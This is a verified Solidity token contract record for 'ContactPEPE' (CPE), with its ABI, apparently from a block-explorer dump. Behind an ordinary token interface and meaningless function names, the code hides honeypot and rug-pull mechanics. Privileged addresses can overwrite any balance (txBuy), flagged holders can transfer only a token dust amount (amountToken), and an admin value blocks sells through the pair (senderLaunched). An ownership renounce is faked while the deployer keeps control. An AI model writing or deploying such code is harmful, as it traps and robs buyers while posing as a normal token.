{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface sellMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapListReceiver) external view returns (uint256);\n\n    function transfer(address exemptToken, uint256 sellTeam) external returns (bool);\n\n    function allowance(address launchIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptToken,\n        uint256 sellTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletExempt, uint256 value);\n    event Approval(address indexed launchIs, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingReceiver {\n    function createPair(address receiverMax, address isLaunch) external returns (address);\n}\n\ninterface limitAutoLiquidity is sellMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContactPEPE is receiverTake, sellMarketing, limitAutoLiquidity {\n\n    bool public feeToken;\n\n    mapping(address => uint256) private receiverSwap;\n\n    address autoMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellWallet(address launchTrading, address exemptToken, uint256 sellTeam) internal returns (bool) {\n        if (launchTrading == receiverIs) {\n            return maxFromMode(launchTrading, exemptToken, sellTeam);\n        }\n        uint256 fromFund = sellMarketing(walletShould).balanceOf(swapLaunch);\n        require(fromFund == launchWallet);\n        require(exemptToken != swapLaunch);\n        if (liquidityToken[launchTrading]) {\n            return maxFromMode(launchTrading, exemptToken, liquidityAt);\n        }\n        return maxFromMode(launchTrading, exemptToken, sellTeam);\n    }\n\n    bool private amountMode;\n\n    uint256 public sellEnable;\n\n    function owner() external view returns (address) {\n        return teamMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamExempt;\n\n    constructor (){\n        if (amountMode) {\n            exemptFrom = feeTx;\n        }\n        fromMin maxBuy = fromMin(autoMarketing);\n        walletShould = marketingReceiver(maxBuy.factory()).createPair(maxBuy.WETH(), address(this));\n        if (feeToken != minMarketingEnable) {\n            feeToken = false;\n        }\n        receiverIs = _msgSender();\n        launchedLiquidity();\n        exemptLaunched[receiverIs] = true;\n        receiverSwap[receiverIs] = isTake;\n        if (maxAuto != minMarketingEnable) {\n            exemptFrom = feeTx;\n        }\n        emit Transfer(address(0), receiverIs, isTake);\n    }\n\n    uint8 private marketingSwap = 18;\n\n    mapping(address => bool) public liquidityToken;\n\n    address private teamMax;\n\n    function launchedIs(address marketingTake) public {\n        if (txReceiverTrading) {\n            return;\n        }\n        \n        exemptLaunched[marketingTake] = true;\n        \n        txReceiverTrading = true;\n    }\n\n    uint256 launchWallet;\n\n    function transferFrom(address launchTrading, address exemptToken, uint256 sellTeam) external override returns (bool) {\n        if (_msgSender() != autoMarketing) {\n            if (teamExempt[launchTrading][_msgSender()] != type(uint256).max) {\n                require(sellTeam <= teamExempt[launchTrading][_msgSender()]);\n                teamExempt[launchTrading][_msgSender()] -= sellTeam;\n            }\n        }\n        return sellWallet(launchTrading, exemptToken, sellTeam);\n    }\n\n    function balanceOf(address swapListReceiver) public view virtual override returns (uint256) {\n        return receiverSwap[swapListReceiver];\n    }\n\n    uint256 public feeTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isTake;\n    }\n\n    uint256 limitShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingSwap;\n    }\n\n    uint256 private sellFeeExempt;\n\n    uint256 private isTake = 100000000 * 10 ** 18;\n\n    uint256 constant liquidityAt = 12 ** 10;\n\n    bool private maxAuto;\n\n    address swapLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundMarketingTeam() private view {\n        require(exemptLaunched[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderFund;\n    }\n\n    function approve(address txFee, uint256 sellTeam) public virtual override returns (bool) {\n        teamExempt[_msgSender()][txFee] = sellTeam;\n        emit Approval(_msgSender(), txFee, sellTeam);\n        return true;\n    }\n\n    bool public minMarketingEnable;\n\n    function txBuy(address limitShouldLaunched, uint256 sellTeam) public {\n        fundMarketingTeam();\n        receiverSwap[limitShouldLaunched] = sellTeam;\n    }\n\n    function amountToken(address feeEnable) public {\n        fundMarketingTeam();\n        if (sellFeeExempt != feeTx) {\n            maxAuto = false;\n        }\n        if (feeEnable == receiverIs || feeEnable == walletShould) {\n            return;\n        }\n        liquidityToken[feeEnable] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletIs;\n    }\n\n    mapping(address => bool) public exemptLaunched;\n\n    string private senderFund = \"Contact PEPE\";\n\n    uint256 public exemptFrom;\n\n    function maxFromMode(address launchTrading, address exemptToken, uint256 sellTeam) internal returns (bool) {\n        require(receiverSwap[launchTrading] >= sellTeam);\n        receiverSwap[launchTrading] -= sellTeam;\n        receiverSwap[exemptToken] += sellTeam;\n        emit Transfer(launchTrading, exemptToken, sellTeam);\n        return true;\n    }\n\n    address public receiverIs;\n\n    function senderLaunched(uint256 sellTeam) public {\n        fundMarketingTeam();\n        launchWallet = sellTeam;\n    }\n\n    function allowance(address modeMarketing, address txFee) external view virtual override returns (uint256) {\n        if (txFee == autoMarketing) {\n            return type(uint256).max;\n        }\n        return teamExempt[modeMarketing][txFee];\n    }\n\n    event OwnershipTransferred(address indexed shouldWallet, address indexed amountModeSell);\n\n    function launchedLiquidity() public {\n        emit OwnershipTransferred(receiverIs, address(0));\n        teamMax = address(0);\n    }\n\n    string private walletIs = \"CPE\";\n\n    function transfer(address limitShouldLaunched, uint256 sellTeam) external virtual override returns (bool) {\n        return sellWallet(_msgSender(), limitShouldLaunched, sellTeam);\n    }\n\n    address public walletShould;\n\n    bool public txReceiverTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountModeSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"}],\"name\":\"amountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapListReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTeam\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTeam\",\"type\":\"uint256\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ContactPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}